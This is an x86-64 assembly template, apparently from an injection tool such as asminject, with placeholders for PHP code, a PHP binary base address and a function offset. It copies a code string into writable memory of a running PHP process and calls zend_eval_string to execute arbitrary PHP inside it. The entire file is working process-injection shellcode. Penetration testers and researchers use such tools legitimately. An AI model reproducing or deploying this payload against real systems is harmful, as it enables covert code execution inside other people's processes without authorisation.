jmp execute_php_code_main

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

execute_php_code_main:

	// copy the PHP name and code string to arbitrary read/write memory
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, php_name[rip]
	push rcx
	mov rcx, [VARIABLE:phpname.length:VARIABLE]
	add rcx, 2												# null terminator
	call asminject_copy_bytes
	pop rcx
	
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 160
	lea rsi, php_code[rip]
	push rcx
	mov rcx, [VARIABLE:phpcode.length:VARIABLE]
	add rcx, 2												# null terminator
	call asminject_copy_bytes
	pop rcx
	// END: copy the PHP string to arbitrary read/write memory
	
	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push rbx
	//lea rdx, php_name[rip]	# arbitrary name
	mov rdx, arbitrary_read_write_data_address[rip]
	add rdx, 32
	xor rsi, rsi				# return value pointer
	//lea rdi, php_code[rip]	# PHP code
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 160
	mov rbx, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:zend_eval_string:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call zend_eval_string("arbitrary PHP code here")

SHELLCODE_SECTION_DELIMITER
	
php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

